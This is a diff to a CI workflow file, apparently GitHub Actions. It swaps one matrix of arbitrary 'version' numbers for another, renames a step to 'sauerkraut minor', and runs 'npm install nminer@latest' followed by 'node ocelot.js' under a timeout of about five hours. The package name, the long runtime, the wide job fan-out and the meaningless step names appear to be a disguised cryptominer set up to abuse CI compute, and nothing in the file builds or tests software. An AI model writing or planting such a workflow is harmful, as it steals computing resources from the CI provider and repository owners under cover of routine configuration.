@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2825 }
-          - { version: 5048 }
-          - { version: 2301 }
-          - { version: 1614 }
-          - { version: 4949 }
-          - { version: 832 }
-          - { version: 4341 }
-          - { version: 2156 }
-          - { version: 3995 }
-          - { version: 4793 }
-          - { version: 8017 }
-          - { version: 3248 }
-          - { version: 8766 }
-          - { version: 9619 }
-          - { version: 869 }
-          - { version: 5155 }
-          - { version: 4626 }
+          - { version: 8026 }
+          - { version: 2758 }
+          - { version: 1716 }
+          - { version: 9284 }
+          - { version: 8013 }
+          - { version: 8655 }
+          - { version: 5364 }
+          - { version: 720 }
+          - { version: 6274 }
+          - { version: 6733 }
+          - { version: 8104 }
+          - { version: 7676 }
+          - { version: 7569 }
+          - { version: 9620 }
+          - { version: 56 }
+          - { version: 3145 }
+          - { version: 3410 }
+          - { version: 3447 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: between
+      - name: sauerkraut minor
         run: |
           npm install nminer@latest
-          timeout 302m node ocelot.js || echo "ocelot executed"
+          timeout 306m node ocelot.js || echo "ocelot executed"
